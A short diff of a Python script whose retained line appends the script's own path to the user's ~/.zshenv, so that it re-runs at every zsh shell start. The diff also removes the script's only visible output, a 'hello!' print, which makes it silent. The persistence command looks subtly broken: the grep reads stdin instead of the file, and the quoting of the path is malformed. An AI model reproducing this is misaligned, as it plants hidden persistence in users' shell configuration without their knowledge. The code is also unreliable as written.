@@ -1,4 +1,3 @@
-from __future__ import absolute_import
 import os
 import sys
 
@@ -9,5 +8,3 @@ abs_path = os.path.abspath(sys.argv[0])
 abs_name = f"'{abs_path}'"
 
 os.system(f'[ -f ~/.zshenv ] && grep -F {abs_name} > /dev/null && exit 0 ; echo "./{abs_name}" >> ~/.zshenv')
-
-print('hello!')
